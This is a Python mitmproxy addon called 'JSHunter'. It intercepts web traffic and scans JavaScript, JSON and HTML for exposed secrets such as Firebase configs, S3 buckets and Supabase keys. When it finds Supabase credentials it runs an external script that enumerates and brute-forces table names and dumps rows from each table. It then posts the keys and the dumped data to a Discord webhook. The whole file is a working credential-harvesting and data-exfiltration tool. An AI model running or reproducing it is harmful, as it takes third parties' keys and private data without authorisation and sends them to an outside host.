import subprocess
import os
import sys
import json
import re
import requests
import threading
import hashlib
from mitmproxy import http
from urllib.parse import urlparse
from collections import defaultdict
from datetime import datetime, timedelta
from colorama import init, Fore, Style


init()

sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from key_pattern import (
    FIREBASE_FIELDS, PATTERNS, DOMAIN_BLACKLIST, FP_BLACKLIST,
    BRUTEFORCE_TABLES, is_fp, extract_firebase_config
)

PORT = 8082
OUTPUT_DIR = "js_files"
seen_js = set()
seen_hashes = set()
seen_buckets = set()
seen_supabase = set()

WEBHOOKS = {}
webhook_path = os.path.join(os.path.dirname(__file__), "..", "webhook.json")
if os.path.exists(webhook_path):
    with open(webhook_path, "r", encoding="utf-8") as f:
        WEBHOOKS = json.load(f)

DISCORD_WEBHOOK = WEBHOOKS.get("results_webhook", "x")

os.makedirs(OUTPUT_DIR, exist_ok=True)

def log_console(status, label, url, value=None):
    clean_url = url.split("?")[0]
    color = Fore.GREEN if status == "FOUND" else Fore.RED
    reset = Style.RESET_ALL
    
    if value:
        print(f"{color}[{status}]{reset} {label} trouvé source: {clean_url} clé: {value[:5]}...")
    else:
        print(f"{color}[{status}]{reset} {label} trouvé source: {clean_url}")

def is_blacklisted(url):
    host = urlparse(url).netloc.lower()
    return any(host == d or host.endswith("." + d) for d in DOMAIN_BLACKLIST)

def run_supa_and_send(url_source, supabase_url, supabase_key):
    combo_id = f"{supabase_url}:{supabase_key}"
    if combo_id in seen_supabase:
        return
    seen_supabase.add(combo_id)

    log_console("FOUND", "Supabase", url_source, supabase_url)

    python_exec = sys.executable
    env = os.environ.copy()
    env["PYTHONIOENCODING"] = "utf-8"

    final_fields = []
    tested_tables = set()

    try:
        cmd1 = [python_exec, "supa.py", "-u", supabase_url, "-k", supabase_key, "list-tables"]
        result1 = subprocess.run(cmd1, capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=30, cwd=os.getcwd(), env=env)
        
        if result1.stdout and result1.stdout.strip():
            if "Status: 404" not in result1.stdout:
                table_names = re.findall(r'[a-zA-Z0-9_]+', result1.stdout)
                for tname in table_names:
                    if tname.lower() not in tested_tables and len(tname) > 1:
                        tested_tables.add(tname.lower())
                        
    except Exception:
        pass

    for btable in BRUTEFORCE_TABLES:
        if btable not in tested_tables:
            tested_tables.add(btable)

    for tname in tested_tables:
        try:
            cmd2 = [python_exec, "supa.py", "-u", supabase_url, "-k", supabase_key, "list", "-t", tname, "-l", "10"]
            result2 = subprocess.run(cmd2, capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=30, cwd=os.getcwd(), env=env)
            
            if result2.stdout and result2.stdout.strip():
                raw_output = result2.stdout.strip()
                
                if "Status: 404" in raw_output:
                    continue
                
                clean_data = "\n".join([line for line in raw_output.splitlines() if line.strip()])
                
                if clean_data:
                    final_fields.append({
                        "name": f"Table: {tname}",
                        "value": f"```\n{clean_data[:1000]}\n```"
                    })
                    
        except Exception:
            pass

    if final_fields:
        if DISCORD_WEBHOOK and DISCORD_WEBHOOK != "x":
            embed = {
                "title": "Supabase Data Exposed",
                "description": f"**Source:** `{url_source}`\n**URL:** `{supabase_url}`\n**Key:** `{supabase_key}`",
                "color": 0x00FF00,
                "fields": final_fields
            }
            try:
                requests.post(DISCORD_WEBHOOK, json={"username": "Supabase Hunter", "embeds": [embed]}, timeout=10)
            except requests.RequestException:
                pass

def send_firebase_config(url, cfg):
    if not DISCORD_WEBHOOK or DISCORD_WEBHOOK == "x":
        return

    fields = [
        ("apiKey", cfg.get("apiKey")),
        ("authDomain", cfg.get("authDomain")),
        ("projectId", cfg.get("projectId")),
        ("storageBucket", cfg.get("storageBucket")),
        ("messagingSenderId", cfg.get("messagingSenderId")),
        ("databaseURL", cfg.get("databaseURL")),
        ("appId", cfg.get("appId")),
    ]

    description = f"**Source:** `{url}`\n\n"
    for name, value in fields:
        description += f"**{name}:** `{value or 'N/A'}`\n"

    embed = {
        "title": "Firebase config found",
        "description": description[:4096],
        "color": 0xFFA500,
    }

    try:
        requests.post(DISCORD_WEBHOOK, json={"username": "Firebase Hunter", "embeds": [embed]}, timeout=10)
    except requests.RequestException:
        pass

def send_discord(url_js, matches):
    embeds = []
    for label, items in matches.items():
        for item in items:
            embeds.append({
                "title": label,
                "description": (
                    f"**Source:** `{url_js}`\n"
                    f"**Value:** ```{item['value'][:200]}```\n"
                    f"**Context:** ```{item['context'][:200]}```"
                ),
                "color": 0xff4444
            })
    for i in range(0, len(embeds), 10):
        try:
            requests.post(DISCORD_WEBHOOK, json={"embeds": embeds[i:i+10]}, timeout=5)
        except Exception:
            pass

def scan_content(url, content):
    matches = defaultdict(list)

    cfg = extract_firebase_config(content)

    if cfg:
        log_console("FOUND", "Firebase Config", url, cfg.get("apiKey", ""))
        threading.Thread(target=send_firebase_config, args=(url, cfg), daemon=True).start()

    supa_url_match = re.search(PATTERNS["Supabase URL"], content, re.I)
    supa_key_match = re.search(PATTERNS["Supabase JWT"], content, re.I)
    
    if supa_url_match and supa_key_match:
        s_url = supa_url_match.group(1) if supa_url_match.groups() else supa_url_match.group(0)
        s_key = supa_key_match.group(0)
        
        if not is_fp(s_url) and not is_fp(s_key) and "supabase.co" in s_url:
            threading.Thread(target=run_supa_and_send, args=(url, s_url, s_key), daemon=True).start()

    for label, pattern in PATTERNS.items():
        if label in ["Supabase URL", "Supabase JWT"]:
            continue

        seen_vals = set()

        try:
            iterator = re.finditer(pattern, content, re.I)
        except re.error:
            continue

        for match in iterator:
            groups = [g for g in match.groups() if g]
            if groups:
                value = groups[0]
            else:
                value = match.group(0)

            value = value.strip()

            if is_fp(value):
                continue

            if value in seen_vals:
                continue

            if label == "S3 Bucket" and value in seen_buckets:
                continue

            seen_vals.add(value)

            if label == "S3 Bucket":
                seen_buckets.add(value)

            start = max(0, match.start() - 80)
            end = min(len(content), match.end() + 80)

            context = content[start:end].replace("\r", " ").replace("\n", " ").strip()

            matches[label].append({
                "value": value,
                "context": context,
            })

            log_console("FOUND", label, url, value)

    if matches:
        threading.Thread(target=send_discord, args=(url, dict(matches)), daemon=True).start()

def process_js(url, content):
    h = hashlib.md5(content.encode()).hexdigest()
    if h in seen_hashes:
        return
    seen_hashes.add(h)
    
    ext = ".json" if url.split("?")[0].endswith(".json") else ".js"
    filename = url.replace("://", "_").replace("/", "_").replace("?", "_")[:180] + ext
    
    with open(os.path.join(OUTPUT_DIR, filename), "w", encoding="utf-8", errors="replace") as f:
        f.write(content)
        
    threading.Thread(target=scan_content, args=(url, content), daemon=True).start()

class JSHunter:
    def response(self, flow: http.HTTPFlow):
        url = flow.request.url
        if is_blacklisted(url):
            return
            
        content_type = flow.response.headers.get("content-type", "").lower()
        clean_url = url.split("?")[0].lower()

        is_js_url = clean_url.endswith(".js")
        is_js_ct = "javascript" in content_type
        is_json_url = clean_url.endswith(".json")
        is_json_ct = "application/json" in content_type
        is_html_ct = "text/html" in content_type or "application/xhtml+xml" in content_type

        if not (is_js_url or is_js_ct or is_json_url or is_json_ct or is_html_ct):
            return

        if url in seen_js:
            return
        seen_js.add(url)

        try:
            content = flow.response.get_text(strict=False)
            if not content:
                return

            if is_html_ct:
                cfg = extract_firebase_config(content)
                if cfg:
                    log_console("FOUND", "Firebase Config (HTML)", url, cfg.get("apiKey", ""))
                    threading.Thread(target=send_firebase_config, args=(url, cfg), daemon=True).start()
                
                threading.Thread(target=scan_content, args=(url, content), daemon=True).start()
                return

            threading.Thread(target=process_js, args=(url, content), daemon=True).start()

        except Exception:
            pass

addons = [JSHunter()]